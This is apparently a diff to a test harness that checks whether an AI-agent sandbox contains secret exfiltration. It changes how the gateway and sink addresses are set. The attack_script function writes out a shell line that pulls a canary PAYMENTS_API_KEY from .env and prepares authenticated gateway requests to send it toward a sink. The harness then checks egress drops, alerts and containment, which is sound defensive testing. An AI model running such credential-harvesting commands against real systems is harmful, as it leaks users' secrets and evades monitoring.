@@ -87,7 +87,7 @@ def leftovers(sid: str) -> list[str]:
 def attack_script(n: int, body: str) -> str:
     """Shell run inside the runtime. Reads the canary from the workspace as
     an agent could, then makes one attempt."""
-    gw = f"http://{ip(n, config.GATEWAY_IP_SUFFIX)}:{config.GATEWAY_PORT}"
+    gw = f"http://{config.GATEWAY_IP}:{config.GATEWAY_PORT}"
     return (f"cd /workspace; C=$(grep PAYMENTS_API_KEY .env | cut -d= -f2); GW={gw}; "
             "AUTH=\"Authorization: Bearer $ANTHROPIC_AUTH_TOKEN\"; "
             "MSG() { printf '{\"model\":\"m\",\"max_tokens\":5,\"messages\":[{\"role\":\"user\",\"content\":\"%s\"}]%s}' \"$1\" \"$2\"; }; "
@@ -135,7 +135,7 @@ def run_direct(name, profile, body, expect, rule, user) -> dict:
     sid = session.create(user, profile)
     s = registry.get(sid)
     n = s["subnet_n"]
-    body = body.replace("{sink}", ip(n, config.SINK_IP_SUFFIX)).replace("{vm}", ip(n, config.VM_IP_SUFFIX))
+    body = body.replace("{sink}", config.SINK_IP).replace("{vm}", ip(n, config.VM_IP_SUFFIX))
     session.run(sid, "shell", attack_script(n, body))
     session.wait(sid, 60)
 
@@ -242,7 +242,7 @@ def run_agent(repo: str, user: str, model: str | None) -> dict:
 
     tel = telemetry(sid, t0)
     drops = [t for t in tel if t.get("event") == "egress_dropped" and t.get("policy") != "quarantine"]
-    to_sink = [t for t in drops if t["dst_ip"] == ip(s["subnet_n"], config.SINK_IP_SUFFIX)]
+    to_sink = [t for t in drops if t["dst_ip"] == config.SINK_IP]
     al = alerts(sid, t0)
     hits = sink_hits(s["canary"], t0)
     contained = registry.get(sid)["state"] == "contained"
